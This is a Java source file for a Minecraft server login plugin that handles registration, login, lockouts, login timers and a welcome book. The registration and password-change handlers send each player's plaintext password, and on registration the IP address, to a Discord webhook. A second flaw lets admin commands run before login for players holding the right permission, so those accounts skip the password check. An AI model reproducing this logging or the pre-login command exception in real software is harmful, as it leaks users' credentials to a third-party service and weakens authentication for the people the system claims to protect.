package me.login.loginsystem; // Correct package

import club.minnced.discord.webhook.WebhookClient;
import me.login.Login; // Import base plugin class
import me.login.discordlinking.DiscordLinkDatabase; // Import renamed class from other package
// LoginDatabase is imported implicitly as it's in the same package
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.inventory.InventoryClickEvent;

// --- ADDED IMPORTS ---
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material; // ADDED
import org.bukkit.World;
import org.bukkit.inventory.ItemStack; // ADDED
import org.bukkit.inventory.meta.BookMeta; // ADDED

import java.util.ArrayList; // ADDED
import java.util.Arrays; // ADDED
import java.util.List; // ADDED
import java.util.Set; // ADDED
// --- END ADDED IMPORTS ---

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.mindrot.jbcrypt.BCrypt;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
//import java.util.Set; // Already imported
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import java.util.stream.Collectors; // ADDED

public class LoginSystem implements Listener {

    private final Login plugin;
    private final LoginDatabase loginDb;
    private final DiscordLinkDatabase discordLinkDb; // Use renamed class/variable name
    private final WebhookClient logWebhook;

    public final Set<UUID> unloggedInPlayers = new HashSet<>();
    // private final Map<UUID, BukkitTask> messageTasks = new HashMap<>(); // REMOVED
    private final Map<UUID, Boolean> needsRegistration = new HashMap<>();
    private final Map<UUID, BukkitTask> kickTasks = new HashMap<>();

    // --- MODIFIED FOR BOSSBAR & HUB ---
    private final Map<UUID, BukkitTask> bossbarTasks = new HashMap<>();
    private final Map<UUID, BossBar> bossBars = new HashMap<>();
    private final Map<UUID, Integer> loginTimeLeft = new HashMap<>();
    private final Location loginLocation;
    private final Location hubLocation; // FIXED: Made final
    // --- END MODIFIED ---

    // --- MODIFIED: Split prefixes for compatibility ---
    private final Component serverPrefixComponent; // For chat messages (modern, full gradient)
    private final String titleLegacyPrefixString; // For BossBar, Title, Kick (from server-prefix-2)
    private final String legacyPrefixPlain; // For book placeholder
    private final LegacyComponentSerializer legacySerializer = LegacyComponentSerializer.legacyAmpersand();
    // --- END MODIFIED ---

    // --- ADDED: Book Config Fields ---
    private final boolean bookEnabled;
    private final String bookTitle;
    private final String bookAuthor;
    private final List<String> bookPages;
    // --- END ADD ---


    // --- ADDED ADMIN COMMAND FIX ---
    private final Set<String> allowedAdminCommands = new HashSet<>(Arrays.asList(
            "/unregister",
            "/loginhistory",
            "/checkalt",
            "/adminchangepass"
    ));
    // --- END ADD ---

    private final Map<UUID, Integer> loginAttempts = new HashMap<>();
    private final Map<UUID, Long> loginLockouts = new HashMap<>();
    private final int MAX_LOGIN_ATTEMPTS = 3;
    private final long LOCKOUT_DURATION_MINUTES = 1;
    private final long LOGIN_TIMEOUT_SECONDS = 60;

    final Pattern passPattern = Pattern.compile("^[a-zA-Z0-9@#_.%&*]{4,20}$");
    final String passwordRequirementsMsg = "§ePassword must be 4-20 characters using letters, numbers, or symbols: @#_.%&*";

    // Constructor updated for renamed class
    public LoginSystem(Login plugin, LoginDatabase loginDb, DiscordLinkDatabase discordLinkDb, WebhookClient logWebhook) {
        this.plugin = plugin;
        this.loginDb = loginDb;
        this.discordLinkDb = discordLinkDb; // Use renamed variable
        this.logWebhook = logWebhook;

        // --- LOAD MINIMESSAGE PREFIX ---
        String prefixString = plugin.getConfig().getString("server_prefix", "<b><gradient:#47F0DE:#42ACF1:#0986EF>ᴍɪɴᴇᴀᴜʀᴏʀᴀ</gradient></b><white>:");
        // 1. For chat messages (modern)
        this.serverPrefixComponent = MiniMessage.miniMessage().deserialize(prefixString + " ");
        // 2. For book/legacy (we must serialize the MiniMessage to legacy)
        this.legacyPrefixPlain = LegacyComponentSerializer.legacySection().serialize(MiniMessage.miniMessage().deserialize(prefixString));
        // --- END LOAD ---

        // --- NEW: Load Legacy Prefix for Titles/Bossbar (from server-prefix-2) ---
        String titlePrefixString = plugin.getConfig().getString("server-prefix-2", "&b&lᴍɪɴᴇᴀᴜʀᴏʀᴀ&f: ");
        this.titleLegacyPrefixString = ChatColor.translateAlternateColorCodes('&', titlePrefixString + " "); // Use ChatColor to translate &x hex codes
        // --- END NEW ---

        // --- LOAD BOOK CONFIG ---
        this.bookEnabled = plugin.getConfig().getBoolean("login-book.enabled", true);
        this.bookTitle = plugin.getConfig().getString("login-book.title", "&aWelcome!");
        this.bookAuthor = plugin.getConfig().getString("login-book.author", "&6MineAurora");
        // This list will be joined into one page.
        this.bookPages = plugin.getConfig().getStringList("login-book.pages");
        if (this.bookPages.isEmpty()) {
            this.bookPages.add("Welcome to <server_prefix>!");
            this.bookPages.add("chose gamemode etc");
        }
        // --- END LOAD ---

        // --- MODIFIED: Load login AND hub locations ---
        World loginWorld = plugin.getServer().getWorld("login");
        if (loginWorld == null) {
            plugin.getLogger().severe("Login world 'login' not found! Teleport feature disabled.");
            this.loginLocation = null;
        } else {
            this.loginLocation = new Location(loginWorld, 0.5, 65, 0.5, 90, 0);
            plugin.getLogger().info("Login location set to 'login' world at 0.5, 65, 0.5");
        }

        World hubWorld = plugin.getServer().getWorld("hub");
        if (hubWorld == null) {
            plugin.getLogger().severe("Hub world 'hub' not found! Post-login teleport disabled.");
            this.hubLocation = null;
        } else {
            // --- FIXED HUB LOCATION (from user request) ---
            this.hubLocation = new Location(hubWorld, 0.5, 80, 0.5, 180, 0); // Yaw 180, Pitch 0
            plugin.getLogger().info("Hub location set to 'hub' world at 0.5, 80, 0.5 (Yaw 180)");
            // --- END FIX ---
        }
    }

    // --- NEW HELPER METHOD for sending prefixed messages ---
    public void sendPrefixedMessage(Player player, String message) {
        player.sendMessage(serverPrefixComponent.append(legacySerializer.deserialize(message)));
    }
    // --- END NEW METHOD ---

    public boolean isUnloggedIn(UUID uuid) { return unloggedInPlayers.contains(uuid); }

    public void sendLog(String message) {
        if (logWebhook != null) {
            logWebhook.send("[LoginSystem] " + message).exceptionally(error -> {
                plugin.getLogger().warning("Failed send login webhook: " + error.getMessage());
                return null;
            });
        }
    }

    // --- Event Handlers ---
    @EventHandler(priority = EventPriority.HIGHEST) public void onPlayerPreLogin(AsyncPlayerPreLoginEvent event) {
        UUID uuid = event.getUniqueId(); long lockoutExpiry = loginLockouts.getOrDefault(uuid, 0L); if (System.currentTimeMillis() < lockoutExpiry) { long rem = TimeUnit.MILLISECONDS.toSeconds(lockoutExpiry - System.currentTimeMillis());
            event.disallow(AsyncPlayerPreLoginEvent.Result.KICK_OTHER, ChatColor.RED + "You have reached max login attempts.\n" + ChatColor.GRAY + "Try again later " + rem + "s.\n\n" + ChatColor.AQUA + "Alpha Mc");
        }
    }

    // --- REWRITTEN onPlayerJoin (fixed invisibility + hub book issue) ---
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        UUID uuid = p.getUniqueId();

        Bukkit.getLogger().info("[LoginDebug] PlayerJoin: " + p.getName());

        // 1. Mark player as un-logged-in until verified
        unloggedInPlayers.add(uuid);

        // 2. Teleport to login world
        if (loginLocation != null) {
            p.teleport(loginLocation);
        } else {
            sendPrefixedMessage(p, "§c§lWARNING: Login world not found. Please contact an admin.");
            unloggedInPlayers.remove(uuid);
            return;
        }

        // 3. Apply login restrictions (darkness + invisibility)
        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            if (p.isOnline() && unloggedInPlayers.contains(uuid)) {
                applyLoginRestrictions(p);
                Bukkit.getLogger().info("[LoginDebug] Applied restrictions for " + p.getName());
            }
        }, 1L);

        // 4. Check database async to see if player is registered
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            boolean isReg = loginDb.isRegistered(uuid);

            plugin.getServer().getScheduler().runTask(plugin, () -> {
                if (!p.isOnline() || !unloggedInPlayers.contains(uuid)) return;

                needsRegistration.put(uuid, !isReg);
                loginAttempts.put(uuid, 0);
                startKickTimer(p);
                loginTimeLeft.put(uuid, (int) LOGIN_TIMEOUT_SECONDS);
                startBossbarTask(p);

                if (isReg) {
                    sendPrefixedMessage(p, "§fYou are not logged in, use §e/login <pass>§f, you have §e" + MAX_LOGIN_ATTEMPTS + " §fattempts left.");
                    p.sendTitle(titleLegacyPrefixString, "§fUse §e/login <pass> §fto login", 10, 100, 20);
                } else {
                    sendPrefixedMessage(p, "§fYou are not registered use §a/register <pass> <pass>");
                    p.sendTitle(titleLegacyPrefixString, "§fYou are not registered use §a/register <pass> <pass>", 10, 100, 20);
                }
            });
        });

        // 5. --- FIX: Ensure restrictions are removed after successful login ---
        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            if (!isUnloggedIn(uuid)) {
                removeLoginRestrictions(p);
                Bukkit.getLogger().info("[LoginFix] Removed leftover invisibility/darkness for " + p.getName());
            }
        }, 40L); // wait ~2s to ensure login/teleport fully completes
    }


    @EventHandler public void onPlayerQuit(PlayerQuitEvent event) {
        UUID uuid = event.getPlayer().getUniqueId(); if (unloggedInPlayers.remove(uuid)) {
            // stopRepeatingMessage(uuid); // REMOVED
            needsRegistration.remove(uuid);
            loginAttempts.remove(uuid);
            cancelKickTimer(uuid);
            // --- ADDED ---
            stopBossbarTask(uuid);
            loginTimeLeft.remove(uuid);
            // --- END ADD ---
        }
    }
    private void applyLoginRestrictions(Player player) {
        player.addPotionEffect(new PotionEffect(PotionEffectType.DARKNESS, Integer.MAX_VALUE, 0, false, false, false));
        player.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, Integer.MAX_VALUE, 0, false, false, false));
    }

    // --- FIXED: Remove ALL effects ---
    private void removeLoginRestrictions(Player player) {
        for (PotionEffect effect : player.getActivePotionEffects()) {
            player.removePotionEffect(effect.getType());
        }
    }
    // --- END FIX ---

    private void startKickTimer(Player player) {
        UUID uuid = player.getUniqueId();
        cancelKickTimer(uuid);
        BukkitTask task = new BukkitRunnable() {
            @Override public void run() {
                if (isUnloggedIn(uuid) && player.isOnline()) {
                    // --- UPDATED KICK (String) ---
                    String kickMsg = titleLegacyPrefixString + "\n\n§cAuthorization time up.";
                    player.kickPlayer(kickMsg);
                    // --- END UPDATE ---
                    sendLog("Kicked timeout: " + player.getName());
                }
                kickTasks.remove(uuid);
            }
        }.runTaskLater(plugin, LOGIN_TIMEOUT_SECONDS * 20L);
        kickTasks.put(uuid, task);
    }

    private void cancelKickTimer(UUID uuid) { BukkitTask task = kickTasks.remove(uuid); if (task != null && !task.isCancelled()) task.cancel(); }

    private void startBossbarTask(Player player) {
        UUID uuid = player.getUniqueId();
        stopBossbarTask(uuid);

        int timeLeft = loginTimeLeft.getOrDefault(uuid, (int) LOGIN_TIMEOUT_SECONDS);

        // --- FIXED: Use titleLegacyPrefixString for BossBar title ---
        String bossBarTitle = titleLegacyPrefixString + "§eYou have " + timeLeft + "s left to log in.";
        BossBar bossBar = Bukkit.createBossBar(bossBarTitle, BarColor.YELLOW, BarStyle.SOLID);
        // --- END FIX ---

        bossBar.setProgress(1.0);
        bossBar.addPlayer(player);
        bossBars.put(uuid, bossBar);

        BukkitTask task = new BukkitRunnable() {
            @Override
            public void run() {
                if (!player.isOnline() || !isUnloggedIn(uuid)) {
                    this.cancel();
                    stopBossbarTask(uuid);
                    return;
                }

                int newTimeLeft = loginTimeLeft.getOrDefault(uuid, 0);
                if (newTimeLeft < 0) newTimeLeft = 0; // Prevent negative display

                // --- FIXED: Use titleLegacyPrefixString for BossBar title ---
                String bossBarTitleUpdate = titleLegacyPrefixString + "§eYou have " + newTimeLeft + "s left to log in.";
                bossBar.setTitle(bossBarTitleUpdate);
                // --- END FIX ---
                bossBar.setProgress((double) newTimeLeft / LOGIN_TIMEOUT_SECONDS);


                if (newTimeLeft == 0) {
                    this.cancel(); // Kick timer will handle the actual kick
                } else {
                    loginTimeLeft.put(uuid, newTimeLeft - 1);
                }
            }
        }.runTaskTimer(plugin, 0L, 20L);
        bossbarTasks.put(uuid, task);
    }

    private void stopBossbarTask(UUID uuid) {
        // Stop the timer
        BukkitTask task = bossbarTasks.remove(uuid);
        if (task != null && !task.isCancelled()) {
            task.cancel();
        }
        BossBar bossBar = bossBars.remove(uuid);
        if (bossBar != null) {
            bossBar.removeAll();
        }
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onPlayerMove(PlayerMoveEvent event) {
        if (isUnloggedIn(event.getPlayer().getUniqueId())) {
            if (event.getFrom().getBlockX() != event.getTo().getBlockX() || event.getFrom().getBlockZ() != event.getTo().getBlockZ()) {
                if (loginLocation != null) {
                    event.setTo(loginLocation);
                } else {
                    event.setTo(event.getFrom());
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onPlayerChat(AsyncPlayerChatEvent event) {
        // Block sending chat
        if (isUnloggedIn(event.getPlayer().getUniqueId())) {
            event.setCancelled(true);
            sendPrefixedMessage(event.getPlayer(), "§cUse: /login <pass>!"); // UPDATED
        }

        // Block receiving chat
        event.getRecipients().removeIf(p -> isUnloggedIn(p.getUniqueId()));
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onPlayerInteract(PlayerInteractEvent event) { if (isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true); }
    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onInventoryOpen(org.bukkit.event.inventory.InventoryOpenEvent event) { if (event.getPlayer() instanceof Player && isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true); }
    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onPlayerDropItem(PlayerDropItemEvent event) { if (isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true); }
    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true) public void onEntityDamage(org.bukkit.event.entity.EntityDamageEvent event) { if (event.getEntity() instanceof Player && isUnloggedIn(event.getEntity().getUniqueId())) event.setCancelled(true); }

    // --- MODIFIED to allow admin commands ---
    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer(); // Added player variable
        UUID uuid = player.getUniqueId();
        if (isUnloggedIn(uuid)) {
            String cmd = event.getMessage().split(" ")[0].toLowerCase();

            // --- ADDED FIX ---
            // Check if it's an allowed admin command AND if the player has permission
            if (allowedAdminCommands.contains(cmd)) {
                // Check for the specific permission for each command
                if (cmd.equals("/unregister") && player.hasPermission("logincore.admin")) { return; }
                if (cmd.equals("/loginhistory") && player.hasPermission("logincore.loginhistory")) { return; }
                if (cmd.equals("/checkalt") && player.hasPermission("logincore.checkalt")) { return; }
                if (cmd.equals("/adminchangepass") && player.hasPermission("logincore.adminchangepass")) { return; }
                // If they have the main admin perm, also allow
                if (player.hasPermission("logincore.admin")) { return; }
            }
            // --- END FIX ---

            boolean needsReg = needsRegistration.getOrDefault(uuid, true);
            long lockout = loginLockouts.getOrDefault(uuid, 0L);
            if (System.currentTimeMillis() < lockout) {
                long rem = TimeUnit.MILLISECONDS.toSeconds(lockout - System.currentTimeMillis());
                sendPrefixedMessage(player, "§cLocked out. Try in " + rem + "s."); // UPDATED
                event.setCancelled(true);
                return;
            }
            if (needsReg) {
                if (!cmd.equals("/register")) {
                    event.setCancelled(true);
                    sendPrefixedMessage(player, "§cYou can only use /register!"); // UPDATED
                }
            } else {
                if (!cmd.equals("/login")) {
                    event.setCancelled(true);
                    sendPrefixedMessage(player, "§cYou can only use /login!"); // UPDATED
                }
            }
        }
    }
    // --- END MODIFIED ---

    // --- Logic Methods ---
    public void handleRegister(Player player, String pass1, String pass2, String ip) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> { UUID uuid = player.getUniqueId(); if (!isUnloggedIn(uuid)) return; if (loginDb.isRegistered(uuid)) {
            sendPrefixedMessage(player, "§cRegistered already! /login"); // UPDATED
            plugin.getServer().getScheduler().runTask(plugin, () -> {
                needsRegistration.put(uuid, false);
                // --- FIXED TITLE ---
                player.sendTitle(titleLegacyPrefixString, "§f/login <password>", 10, 100, 20);
            });
            return;
        }
            if (!pass1.equals(pass2)) { sendPrefixedMessage(player, "§cPasswords mismatch!"); return; } // UPDATED
            if (!passPattern.matcher(pass1).matches()) {
                sendPrefixedMessage(player, "§cInvalid password format!"); // UPDATED
                sendPrefixedMessage(player, passwordRequirementsMsg.replace("§", "&")); // UPDATED
                return;
            }
            String hashed = BCrypt.hashpw(pass1, BCrypt.gensalt()); loginDb.registerPlayer(uuid, hashed, ip); plugin.getServer().getScheduler().runTask(plugin, () -> {
                unloggedInPlayers.remove(uuid);
                removeLoginRestrictions(player); // This now removes Invisibility
                needsRegistration.remove(uuid);
                cancelKickTimer(uuid);
                stopBossbarTask(uuid);
                loginTimeLeft.remove(uuid);
                sendPrefixedMessage(player, "§a§lRegistered successfully!"); // UPDATED
                sendLog("Register: " + player.getName() + " (IP: " + ip + ") Pass: ||" + pass1 + "||");

                if (hubLocation != null) {
                    player.teleport(hubLocation);
                    // player.sendTitle("§aWelcome", "§fyou are playing on play.mineaurora.fun", 10, 70, 20); // REMOVED
                    giveWelcomeBook(player); // --- ADDED BOOK ---
                } else {
                    sendPrefixedMessage(player, "§cSuccessfully registered, but the hub world is missing!"); // UPDATED
                }
            }); });
    }

    public void handleLogin(Player player, String password, String ip) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> { UUID uuid = player.getUniqueId(); if (!isUnloggedIn(uuid)) return; long lockout = loginLockouts.getOrDefault(uuid, 0L);
            if (System.currentTimeMillis() < lockout) {
                long rem = TimeUnit.MILLISECONDS.toSeconds(lockout - System.currentTimeMillis());
                sendPrefixedMessage(player, "§cLocked out. Try in " + rem + "s."); // UPDATED
                return;
            }
            String hash = loginDb.getPasswordHash(uuid); if (hash == null) {
                sendPrefixedMessage(player, "§cYou are not registered yet! use /register"); // UPDATED
                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    needsRegistration.put(uuid, true);

                    stopBossbarTask(uuid);
                    loginTimeLeft.put(uuid, (int) LOGIN_TIMEOUT_SECONDS); // Reset timer
                    startBossbarTask(player);

                    // --- FIXED TITLE ---
                    player.sendTitle(titleLegacyPrefixString, "§a/register <pass> <pass>", 10, 100, 20);
                });
                return;
            }
            if (BCrypt.checkpw(password, hash)) { long ts = System.currentTimeMillis(); loginDb.updateLoginInfo(uuid, ip, ts); loginAttempts.remove(uuid); plugin.getServer().getScheduler().runTask(plugin, () -> {
                unloggedInPlayers.remove(uuid);
                removeLoginRestrictions(player); // This now removes Invisibility
                Bukkit.getLogger().info("[LoginDebug] Login success — unloggedInPlayers.contains=" + unloggedInPlayers.contains(uuid));
                needsRegistration.remove(uuid);
                cancelKickTimer(uuid);
                stopBossbarTask(uuid);
                loginTimeLeft.remove(uuid);
                sendPrefixedMessage(player, "§a§lLogin Successful!"); // UPDATED
                if (hubLocation != null) {
                    player.teleport(hubLocation);
                    giveWelcomeBook(player); // --- ADDED BOOK ---
                } else {
                    sendPrefixedMessage(player, "§cSuccessfully logged in, but the hub world is missing!"); // UPDATED
                }
            }); } else { int att = loginAttempts.getOrDefault(uuid, 0) + 1; loginAttempts.put(uuid, att); if (att >= MAX_LOGIN_ATTEMPTS) { long exp = System.currentTimeMillis() + TimeUnit.MINUTES.toMillis(LOCKOUT_DURATION_MINUTES); loginLockouts.put(uuid, exp); loginAttempts.remove(uuid);
                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    // --- UPDATED KICK (String) ---
                    String kickMsg = titleLegacyPrefixString + "\n§cYou've entered wrong password many times!\n§cTry again in §e" + LOCKOUT_DURATION_MINUTES + "§c min.";
                    player.kickPlayer(kickMsg);
                    // --- END UPDATE ---
                });
                sendLog("Account locked: " + player.getName() + " (IP: " + ip + ")"); } else {
                sendPrefixedMessage(player, "§cYou've enetered the wrong password, you have§6 " + (MAX_LOGIN_ATTEMPTS - att) + " §cattempt left."); // UPDATED
            } } });
    }

    // --- FIXED giveWelcomeBook (auto open + remove from inventory) ---
    private void giveWelcomeBook(Player player) {
        if (!bookEnabled) return;

        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
        BookMeta meta = (BookMeta) book.getItemMeta();

        String title = ChatColor.translateAlternateColorCodes('&', bookTitle.replace("<server_prefix>", legacyPrefixPlain));
        String author = ChatColor.translateAlternateColorCodes('&', bookAuthor.replace("<server_prefix>", legacyPrefixPlain));

        meta.setTitle(title);
        meta.setAuthor(author);

        String singlePageContent = bookPages.stream()
                .map(line -> line.replace("<server_prefix>", legacyPrefixPlain))
                .collect(Collectors.joining("\n"));
        String processedPage = ChatColor.translateAlternateColorCodes('&', singlePageContent);
        meta.addPage(processedPage);
        book.setItemMeta(meta);

        // Give, open, and then remove immediately
        player.getInventory().addItem(book);
        player.openBook(book);

        // Remove book next tick (prevents lingering)
        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            player.getInventory().remove(Material.WRITTEN_BOOK);
            Bukkit.getLogger().info("[LoginFix] Removed welcome book for " + player.getName());
        }, 2L); // 2 ticks = ~0.1s delay
    }
// --- END FIX ---

    @EventHandler(priority = EventPriority.MONITOR)
    public void onAnyInventoryClick(org.bukkit.event.inventory.InventoryClickEvent event) {
        Player p = (Player) event.getWhoClicked();
        Bukkit.getLogger().info("[ClickDebug] " + p.getName() +
                " clicked in " + event.getView().getTitle() +
                " slot=" + event.getSlot() +
                " cancelled=" + event.isCancelled());
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = false)
    public void onInventoryClickDebug(InventoryClickEvent event) {
        // ⚠️ This does NOT cancel anything — it only logs existing cancellations
        try {
            if (event.isCancelled()) {
                Bukkit.getLogger().info("[CancelTrace] " + event.getWhoClicked().getName() + " click cancelled at:");
                Exception e = new Exception();
                for (StackTraceElement el : e.getStackTrace()) {
                    if (el.getClassName().contains("login")) {
                        Bukkit.getLogger().info("  at " + el);
                    }
                }
            }
        } catch (Throwable t) {
            // Prevent debug exceptions from ever cancelling clicks
            Bukkit.getLogger().warning("[CancelTrace] Debug listener error: " + t.getMessage());
        }
    }


    public void handleChangePassword(Player player, String oldPass, String newPass) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            UUID uuid = player.getUniqueId(); if (isUnloggedIn(uuid)) { sendPrefixedMessage(player, "§cMust be logged in."); return; } // UPDATED
            String hash = loginDb.getPasswordHash(uuid); if (hash == null) { sendPrefixedMessage(player, "§cYou are not registered."); return; } // UPDATED
            if (!discordLinkDb.isLinked(uuid)) { sendPrefixedMessage(player, "§cMust link your minecraft account to discord first! /discord link"); return; } // UPDATED
            if (!BCrypt.checkpw(oldPass, hash)) { sendPrefixedMessage(player, "§cOld password is incorrect."); return; } // UPDATED
            if (oldPass.equals(newPass)) { sendPrefixedMessage(player, "§cNew password cannot be the same!"); return; } // UPDATED
            if (!passPattern.matcher(newPass).matches()) {
                sendPrefixedMessage(player, "§cInvalid password format!"); // UPDATED
                sendPrefixedMessage(player, passwordRequirementsMsg.replace("§", "&")); // UPDATED
                return;
            }
            String newHashed = BCrypt.hashpw(newPass, BCrypt.gensalt()); loginDb.updatePassword(uuid, newHashed);
            sendPrefixedMessage(player, "§a§lPassword Changed successfully!"); // UPDATED
            sendLog("Password change: " + player.getName() + " New Pass: ||" + newPass + "||"); });
    }
}